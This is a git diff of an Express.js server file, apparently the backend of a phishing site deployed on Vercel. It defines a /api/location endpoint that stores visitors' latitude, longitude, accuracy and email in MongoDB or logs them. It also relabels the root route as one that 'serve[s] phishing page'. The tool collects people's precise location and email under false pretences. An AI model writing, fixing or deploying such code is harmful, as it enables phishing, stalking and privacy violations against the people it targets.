@@ -16,12 +16,9 @@ app.use(express.static(path.join(__dirname, '../public')));
 
 // ============= MONGODB CONNECTION =============
 if (process.env.MONGODB_URI) {
-  mongoose.connect(process.env.MONGODB_URI, {
-    useNewUrlParser: true,
-    useUnifiedTopology: true,
-  })
-  .then(() => console.log('✅ MongoDB Connected'))
-  .catch(err => console.error('❌ MongoDB Error:', err.message));
+  mongoose.connect(process.env.MONGODB_URI)
+    .then(() => console.log('✅ MongoDB Connected'))
+    .catch(err => console.error('❌ MongoDB Error:', err.message));
 
   // Location Schema
   const locationSchema = new mongoose.Schema({
@@ -34,7 +31,7 @@ if (process.env.MONGODB_URI) {
 
   const Location = mongoose.model('Location', locationSchema);
 
-  // ============= LOCATION ENDPOINT =============
+  // ============= LOCATION ENDPOINT (Mongo mode) =============
   app.post('/api/location', async (req, res) => {
     try {
       const { lat, lon, accuracy, email } = req.body;
@@ -51,8 +48,8 @@ if (process.env.MONGODB_URI) {
       await newLocation.save();
       console.log('✅ Location saved to MongoDB');
 
-      res.json({ 
-        status: 'success', 
+      res.json({
+        status: 'success',
         message: 'Location saved successfully',
         data: { lat, lon, accuracy, email }
       });
@@ -64,15 +61,15 @@ if (process.env.MONGODB_URI) {
   });
 
 } else {
-  // ============= LOCAL ENDPOINT (No MongoDB) =============
+  // ============= LOCATION ENDPOINT (No DB mode) =============
   app.post('/api/location', (req, res) => {
     try {
       const { lat, lon, accuracy, email } = req.body;
 
-      console.log('📍 Location received:', { lat, lon, accuracy, email });
+      console.log('📍 Location received (NO DB):', { lat, lon, accuracy, email });
 
-      res.json({ 
-        status: 'success', 
+      res.json({
+        status: 'success',
         message: 'Location received (Local mode - no DB)',
         data: { lat, lon, accuracy, email }
       });
@@ -84,20 +81,10 @@ if (process.env.MONGODB_URI) {
   });
 }
 
-// Root route
+// Root route - serve phishing page
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, '../public', 'index.html'));
 });
 
-// Export for Vercel
+// Sirf export, yaha koi app.listen() NAHI
 module.exports = app;
-
-// Local server (sirf localhost pe)
-if (!process.env.VERCEL) {
-  const PORT = process.env.PORT || 3000;
-  if (!app.listening) {
-    app.listen(PORT, () => {
-      console.log(`🚀 Server running at http://localhost:${PORT}`);
-    });
-  }
-}
